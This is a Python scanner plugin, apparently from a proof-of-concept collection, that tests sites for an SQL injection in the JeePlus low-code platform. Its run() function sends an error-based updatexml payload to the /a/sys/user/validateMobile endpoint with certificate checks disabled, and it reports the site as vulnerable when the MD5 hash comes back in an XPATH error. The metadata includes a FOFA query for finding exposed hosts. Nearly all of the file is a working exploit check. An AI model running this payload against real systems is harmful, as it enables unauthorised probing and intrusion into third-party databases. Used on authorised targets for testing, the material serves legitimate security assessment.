#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s?__biz=MzkzMjI1MDQwMg==&mid=2247484202&idx=1&sn=1e135f2bba63a8793c6830e272383312&chksm=c37da5654e6ab4b7465cc032b42f1830b96c1676d0b804f429454bfa1e12226e2482a0d9e498&scene=27&key=5f77d834834efca12ef21d306e9523e26190574d75a716b07fed41b3dab3b83dacb06c0ce4080469fed97c2b9d660c555b23a439c819aba510b50f8c879489be42e411eabe3d62b9ba3121286636caa9accd54f67376787df030674e7ccb394c0f0fcb2aab5f445b3c57888e1f85a3c76960560dd591550c895f8549d514efc6&ascene=0&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=63090819&lang=zh_CN&countrycode=GY&exportkey=n_ChQIAhIQAe2Q36RO7PeDDgm7Vjg6UhLgAQIE97dBBAEAAAAAAI0iJ%2BTy98AAAAAOpnltbLcz9gKNyK89dVj0PTNCfqq%2FiUz8mU9KnwgJCjf8tQvHrWz4P%2FB%2FSxz4U3vwuJyg%2FZhPQxFRsMjhP%2FyN6ZUr%2BUy4ql8Bztlq1g%2BBwsMiU4eXOxXHqDzXnrs72Du%2Ff2OTQ5vi9mAKOkCahr9z%2BVtJGHdJWfYLatsz3Y64Hc%2B0ayd%2FG%2BthWW%2FDIOGKt4vCNLiyCySx4SVRO7tqXqj79VvQb1KAeyuKN%2B9vyCEJF0XknPoR7sWP8ZS0PFSFqwqJvS1yXdQFxVdm&acctmode=0&pass_ticket=%2FKWadn8kXXZxYKWGl5t7CU3yYNHQUMnxEY%2BKtJtqA8qlwrGJNG3b2187DiwHgJBH3R1ktcML%2BN46O%2FXqeOXWDg%3D%3D&wx_header=1',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'JeePlus低代码开发平台存在SQL注入',

      'level'     :   'high',

      'FOFA'      :   'app="JeePlus"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/2/25',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/a/sys/user/validateMobile?mobile=1%27+and+1%3D%28updatexml%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%2C1%29%29+and+%271%27%3D%271'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 500 and re.search(r'XPATH syntax error.*?c4ca4238',res.text,re.S|re.I):
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret